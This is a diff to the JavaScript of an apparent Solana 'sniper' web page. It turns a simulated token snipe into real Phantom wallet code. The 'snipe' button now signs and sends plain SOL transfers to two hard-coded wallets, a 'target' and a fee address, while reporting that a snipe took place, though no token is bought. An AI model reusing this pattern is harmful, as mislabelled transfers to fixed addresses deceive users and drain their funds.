@@ -1,39 +1,54 @@
 
+const { Connection, PublicKey, Transaction, SystemProgram, sendTransaction } = solanaWeb3;
 const activityFeed = document.getElementById('activityFeed');
-function addActivity(message) {
-    const item = document.createElement('li');
-    item.textContent = message;
-    activityFeed.prepend(item);
+
+function addActivity(msg) {
+    const li = document.createElement('li');
+    li.textContent = msg;
+    activityFeed.prepend(li);
 }
 
-// Wallet Connect
+let provider = null;
+let publicKey = null;
+
 document.getElementById('connectWallet').addEventListener('click', async () => {
+    provider = window.phantom?.solana;
+    if (!provider?.isPhantom) return alert("Bitte Phantom installieren");
     try {
-        const provider = window.phantom?.solana;
-        if (!provider || !provider.isPhantom) {
-            alert('Bitte Phantom Wallet installieren');
-            return;
-        }
-        const resp = await provider.connect();
-        document.getElementById('walletAddress').innerText = `Verbunden: ${resp.publicKey.toString()}`;
-        addActivity(`✅ Wallet verbunden: ${resp.publicKey.toString()}`);
+        const res = await provider.connect();
+        publicKey = res.publicKey;
+        document.getElementById('walletAddress').innerText = `Verbunden: ${publicKey.toString()}`;
+        addActivity(`✅ Verbunden mit ${publicKey.toString()}`);
     } catch (err) {
-        console.error('Wallet Fehler:', err);
-        addActivity('❌ Wallet-Verbindung fehlgeschlagen');
+        addActivity('❌ Verbindung fehlgeschlagen');
     }
 });
 
-// Simulierter Token-Daten Abruf
-function loadTokenData() {
-    document.getElementById('tokenName').innerText = "Token: $PRINTER";
-    document.getElementById('tokenPrice').innerText = "Preis: 0.000023 SOL";
-    document.getElementById('tokenVolume').innerText = "Volumen: 6.3 SOL";
-    document.getElementById('tokenChange').innerText = "24h Änderung: +13.4%";
-}
-loadTokenData();
-
-// Sniper Buy (Demo)
 document.getElementById('snipeBtn').addEventListener('click', async () => {
-    document.getElementById('snipeStatus').innerText = "Sniping ausgeführt (Simuliert)...";
-    addActivity("🟢 $PRINTER gesniped – 0.1 SOL (Demo)");
+    if (!provider || !publicKey) return alert("Bitte zuerst Wallet verbinden");
+    try {
+        const connection = new Connection("https://api.devnet.solana.com");
+        const feeWallet = new PublicKey("6UnfcAwWPcD17ZJ2D1PtJkaRr9uhymZUa793zgyRARzB");
+        const targetWallet = new PublicKey("GvDMoD7U8KnLwEnG13t2kJ5Xm3e7TZhrmvwFazsWz2iw"); // Beispiel-Adresse
+
+        const transaction = new Transaction().add(
+            SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: targetWallet,
+                lamports: 90000000 // 0.09 SOL
+            }),
+            SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: feeWallet,
+                lamports: 10000000 // 0.01 SOL Fee
+            })
+        );
+
+        const { signature } = await provider.signAndSendTransaction(transaction);
+        addActivity(`🟢 Sniping TX gesendet: https://solscan.io/tx/${signature}?cluster=devnet`);
+        document.getElementById('snipeStatus').innerText = "Sniping gesendet!";
+    } catch (err) {
+        console.error(err);
+        addActivity("❌ Fehler beim Snipen");
+    }
 });
